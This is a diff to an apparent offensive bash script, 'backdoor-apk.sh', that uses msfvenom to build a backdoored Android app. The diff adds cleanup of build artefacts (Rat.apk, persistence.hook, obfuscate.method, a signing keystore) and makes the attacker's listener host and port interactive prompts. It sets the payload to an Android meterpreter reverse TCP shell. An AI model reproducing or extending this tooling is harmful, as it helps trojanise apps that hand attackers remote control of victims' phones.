@@ -1,5 +1,13 @@
 #!/bin/bash
-
+rm -vrf bin
+rm -vrf libs
+rm -vrf original
+rm -vrf payload
+rm -v Rat.apk
+rm -v perms.tmp
+rm -v persistence.hook
+rm -v obfuscate.method
+rm -v signing.keystore
 # backdoor-apk.sh
 
 # version: 0.1.2
@@ -12,8 +20,10 @@
 
 # modify the following values as necessary
 MSFVENOM=msfvenom
-LHOST="10.6.9.31"
-LPORT="1337"
+echo -n "Type LHOST: "
+read LHOST
+echo -n "Type LPORT: "
+read LPORT
 #PAYLOAD="android/meterpreter/reverse_http"
 #PAYLOAD="android/meterpreter/reverse_https"
 PAYLOAD="android/meterpreter/reverse_tcp"
